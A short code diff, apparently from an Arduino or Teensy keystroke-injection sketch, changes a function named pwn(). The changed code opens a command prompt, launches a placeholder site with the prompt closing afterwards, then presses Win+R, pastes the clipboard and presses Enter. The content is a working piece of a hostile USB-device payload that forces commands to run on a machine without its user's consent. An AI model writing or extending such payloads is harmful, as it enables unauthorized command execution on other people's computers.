@@ -45,7 +45,7 @@ void pwn()
 
   openapp("cmd");
  delay(250);
- Keyboard.println("start JACKSITE");
+ Keyboard.println("start JACKSITE && exit");
  delay(620);
  key(KEY_A , MODIFIERKEY_CTRL);
  delay(150);
@@ -53,7 +53,11 @@ void pwn()
  delay(150);
  key(KEY_W , MODIFIERKEY_CTRL);
  delay(150);
+ key(KEY_R , MODIFIERKEY_RIGHT_GUI);
+ delay(150);
  key(KEY_V , MODIFIERKEY_CTRL);
+ delay(100);
+ key(KEY_ENTER, 0);
 
 
 }
